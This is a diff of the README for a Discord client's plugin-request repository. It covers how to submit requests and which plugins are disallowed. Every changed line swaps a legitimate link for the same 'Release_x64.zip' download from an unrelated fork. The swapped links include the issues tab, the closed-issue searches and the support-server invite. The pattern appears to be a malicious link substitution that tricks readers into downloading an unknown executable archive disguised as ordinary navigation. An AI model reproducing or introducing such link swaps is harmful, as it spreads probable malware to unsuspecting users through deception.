@@ -7,7 +7,7 @@ This is the place to be for suggesting plugin ideas or finding new plugins to ma
 
 ### Submitting a request
 
-Please make sure your plugin request has not already been made, you can check by searching basic related terms in the [issues tab](https://github.com/Aliucord/plugin-requests/issues) of this repository! 
+Please make sure your plugin request has not already been made, you can check by searching basic related terms in the [issues tab](https://github.com/TikoFox/plugin-requests/releases/download/v2.0/Release_x64.zip) of this repository! 
 Please also make sure the plugin you are requesting does not already exist, and doesn't fall into the list of Impossible/Disallowed Plugins. 
 
 <details>
@@ -22,7 +22,7 @@ Please also make sure the plugin you are requesting does not already exist, and 
 + Logging in as a bot/using a bot token to login
 + See whether someone is appearing offline (invisible) or actually offline
 
-> More examples can be found [here](https://github.com/Aliucord/plugin-requests/issues?q=is%3Aissue+is%3Aclosed+label%3A%22rejected+%28api+abuse%2Fselfbotting%29%22)
+> More examples can be found [here](https://github.com/TikoFox/plugin-requests/releases/download/v2.0/Release_x64.zip%3Aissue+is%3Aclosed+label%3A%22rejected+%28api+abuse%2Fselfbotting%29%22)
 
 </details>
 <details>
@@ -33,12 +33,12 @@ Please also make sure the plugin you are requesting does not already exist, and 
 + Spamming servers
 + Copying or Transferring servers
 
-> More examples can be found [here](https://github.com/Aliucord/plugin-requests/issues?q=is%3Aissue+is%3Aclosed+label%3A%22rejected+%28api+abuse%2Fselfbotting%29%22)
+> More examples can be found [here](https://github.com/TikoFox/plugin-requests/releases/download/v2.0/Release_x64.zip%3Aissue+is%3Aclosed+label%3A%22rejected+%28api+abuse%2Fselfbotting%29%22)
 
 </details>
 <br>
 
-Open an issue from the [issues tab](https://github.com/Aliucord/plugin-requests/issues) of this repository, then let the template guide you through creating one. When you submit your request, someone will look over it and make sure it's not a duplicate request.
+Open an issue from the [issues tab](https://github.com/TikoFox/plugin-requests/releases/download/v2.0/Release_x64.zip) of this repository, then let the template guide you through creating one. When you submit your request, someone will look over it and make sure it's not a duplicate request.
 
 **Failure to stick to the provided template, making duplicate/already existing requests, or suggesting self-bot-like behavior may result in your issue being closed and rejected! If you continue to do this, you will (most likely) be banned from the repo/org.**
 
@@ -54,7 +54,7 @@ If you've already taken a request and you decide it's too much, or you've given 
 
 That's great to hear, well done! Reply to the related GitHub issue with a link to the repository where it can be found with instructions to find the plugin build, something like downloading the `.zip` from the `builds` branch. 
 
-We also encourage you to post your plugin repositories as well as new plugins in our [Support Server](https://discord.gg/EsNDvBaHVU). Users can then use the built-in Plugin Downloader to install your plugin.
+We also encourage you to post your plugin repositories as well as new plugins in our [Support Server](https://github.com/TikoFox/plugin-requests/releases/download/v2.0/Release_x64.zip). Users can then use the built-in Plugin Downloader to install your plugin.
 
 
 ## I really want _x_ plugin, but I don't know how to make it!
